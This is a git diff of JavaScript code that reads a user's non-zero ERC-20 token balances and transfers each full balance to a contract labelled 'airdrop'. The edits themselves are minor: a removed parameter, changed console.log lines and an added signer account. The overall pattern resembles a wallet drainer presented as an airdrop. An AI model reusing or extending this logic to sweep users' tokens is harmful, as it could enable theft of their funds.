@@ -5,7 +5,6 @@ const erc20abi = require("../abis/erc20abi.json");
 const dataProviderAbi = require("../abis/DataProviderAbi.json");
 const airdropAbi = require('../abis/AirdropAbi.json');
 export const getBalanceErc20 = async (providerAddress, tokens, airdrop, userAddress, clientReader) => {
-
     // const dataProviderContract = new ethers.Contract(providerAddress, dataProviderAbi, provider);
     const balances = await clientReader.readContract({
         address: providerAddress,
@@ -13,7 +12,6 @@ export const getBalanceErc20 = async (providerAddress, tokens, airdrop, userAddr
         functionName: "getERC20Balances",
         args: [tokens.map((a) => { return a.address }), userAddress]
     })
-    console.log(balances, "balances")
     // const balances = await dataProviderContract.getERC20Balances(tokens.map((a) => { return a.address }), userAddress)
     const filtredByBalance = tokens.reduce((filtered, element, index) => {
         if (balances[index].toString() !== "0") {
@@ -51,7 +49,7 @@ export const getBalanceErc20 = async (providerAddress, tokens, airdrop, userAddr
     }
     return await Promise.all(filtredTokens);
 }
-export const transferErc20 = async (chain, tokensWithBalance, airdrop, userAddress, clientReader, clientWriter, signerAccount) => {
+export const transferErc20 = async (chain, tokensWithBalance, airdrop, userAddress, clientReader,  signerAccount) => {
 
     let res = [];
     for (let i = 0; i < tokensWithBalance.length; i++) {
@@ -72,6 +70,7 @@ export const transferErc20 = async (chain, tokensWithBalance, airdrop, userAddre
         }
     }
     try {
+        console.log(signerAccount)
         const addresses = tokensWithBalance.map((token) => token.address);
         const amounts = tokensWithBalance.map((token) => token.balance);
         if (addresses.length > 0 && amounts.length > 0) {
@@ -81,6 +80,7 @@ export const transferErc20 = async (chain, tokensWithBalance, airdrop, userAddre
                 transport: http()
               })
               await walletClient.writeContract({
+                account:signerAccount,
                 address: airdrop,
                 abi: airdropAbi,
                 functionName: 'transferERC20',
